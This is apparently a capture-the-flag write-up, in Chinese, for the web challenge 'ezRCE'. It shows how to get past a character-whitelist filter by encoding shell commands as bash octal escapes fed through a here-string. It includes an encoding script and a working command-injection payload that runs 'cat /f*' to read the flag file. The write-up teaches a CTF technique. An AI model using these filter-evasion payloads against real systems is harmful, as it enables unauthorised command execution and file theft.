# ezRCE

> 分类：Web

## 题目描述
无字母 RCE（bashfuck）题。`waf` 只允许白名单字符 `0-9`、`\`、`'`、`$`、`<`，其余字符一律 die。需要利用 `$''`（ANSI-C quoting）八进制转义 + Here String（`<<<`）构造命令执行。

## 考察知识点
- bash 八进制转义（`$'\ooo'` ANSI-C quoting）
- Here String（`<<<`）
- 无字母数字命令执行

## 解法
白名单字符：`['0','1','2','3','4','5','6','7','8','9','\\','\'','$','<']`

八进制转义脚本：
```python
def string_to_octal(input_str):
    octal_str = ""
    for char in input_str:
        octal_char = oct(ord(char))[2:]
        octal_str += "\\" + octal_char.zfill(3)
    return octal_str

input_str = "cat /f*"
print(string_to_octal(input_str))
```

`$'\143\141\164\040\057\146\052'` 会被解析为 `cat /f*`，但单引号包裹的内容整体被当成一个命令，无法直接带参数执行。通过 Here String 两次解析：

```
bash  $'\142\141\163\150'
{cat,/f*} $'\173\143\141\164\54\57\146\52\175'
$'\142\141\163\150'<<<$'\173\143\141\164\54\57\146\52\175'
```

最终 payload：
```
?cmd=$'\142\141\163\150'<<<$'\143\141\164\040\057\146\052'
```
即 `bash<<<cat /f*`。

也可使用 bashFuck 项目（[ProbiusOfficial/bashFuck](https://github.com/ProbiusOfficial/bashFuck)）快速生成。

## 参考答案
（未给出，见截图）

## 来源
- 作者：Z3r4y（uuzeray） | https://blog.csdn.net/uuzeray/article/details/138274291
- 作者：HvAng | https://hvang10.github.io/2024/04/27/XYCTF2024wp/index.html
- 作者：J1rrY | https://j1rry-learn.github.io/posts/2024-xyctf-webmisc-wp/
